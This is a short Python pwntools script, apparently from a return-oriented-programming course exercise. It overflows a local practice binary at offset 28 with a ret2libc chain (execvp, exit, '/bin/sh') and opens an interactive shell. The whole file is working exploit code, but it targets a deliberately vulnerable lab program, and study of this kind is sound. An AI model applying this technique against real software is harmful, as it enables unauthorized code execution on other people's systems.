#!/usr/bin/python
from pwn import *

def main():
	'''
	0x080482e9 : pop ebx ; ret
	'''
	pr = p32(0x080482e9)
	r = p32(0x080482ea) 


	'''
	0x080484e9 : pop esi ; pop edi ; pop ebp ; ret
	'''
	pppr = p32(0x080484e9) 	


	'''
	$3 = {<text variable, no debug info>} 0xf7e4fda0 <system>
	'''
	system = p32(0xf7e4fda0)

	'''
	$1 = {<text variable, no debug info>} 0xf7ec5bf0 <execvp>
	'''
	execvp = p32(0xf7ec5bf0)


	'''
	$1 = {<text variable, no debug info>} 0xf7e439d0 <exit>
	'''
	exit = p32(0xf7e439d0)


	'''
	gdb-peda$ find /bin/sh
	Searching for '/bin/sh' in: None ranges
	Found 1 results, display max 1 items:
	libc : 0xf7f70a0b ("/bin/sh")
	'''
	bin_sh = p32(0xf7f70a0b)


	# craft rop
	# rop = system + pop_ret + bin_sh + exit
	# rop = system + exit + bin_sh 
	rop = execvp + exit + bin_sh

	# start the process
	p = process("../rop_crash_course/vuln1-nocanary-execstack")


	'''
	0x413b4141 in ?? ()
	gdb-peda$ pattern_offset 0x413b4141
	1094402369 found at offset: 28
	'''	

	# craft payload
	payload = 'A' * 28 + rop
	#payload = payload.ljust(1000, "\x00")

	# print process id
	#raw_input(str(p.proc.pid))

	# send payload
	p.send(payload)

	# transfer interaction to user
	p.interactive() 

if __name__ == "__main__":
	main()
